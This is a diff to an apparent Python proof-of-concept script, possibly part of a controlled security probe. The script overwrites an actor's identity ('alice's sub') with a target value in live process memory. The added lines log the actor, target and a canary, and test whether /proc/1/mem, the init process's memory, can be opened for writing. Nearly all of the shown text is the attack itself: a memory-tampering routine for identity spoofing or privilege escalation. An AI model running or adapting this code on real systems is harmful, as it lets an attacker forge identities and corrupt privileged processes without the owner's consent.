@@ -33,6 +33,7 @@ def log(msg):
     print(msg)
     report['lines'].append(msg)
 
+log(f"P2R_BOOT alice={ALICE[:8]}...{ALICE[-4:]} target={TARGET[:8]} canary={CANARY}")
 if not ALICE:
     log("VERDICT=NO_ALICE_ACTOR_PROVIDED")
     sys.exit(1)
@@ -62,6 +63,13 @@ if len(target_bytes) > len(alice_bytes):
     sys.exit(1)
 replacement = target_bytes + b'\x00' * (len(alice_bytes) - len(target_bytes))
 log(f"MUTATE alice_len={len(alice_bytes)} target={target_bytes!r} replacement_len={len(replacement)}")
+
+# Pre-test: can we even open /proc/1/mem for write?
+try:
+    with open('/proc/1/mem', 'r+b') as test_mem:
+        log("MEM_OPEN_RW=ok")
+except Exception as e:
+    log(f"MEM_OPEN_RW_ERR={type(e).__name__}: {str(e)[:200]}")
 
 # 3. Find + overwrite all occurrences of alice's sub
 mutations = 0
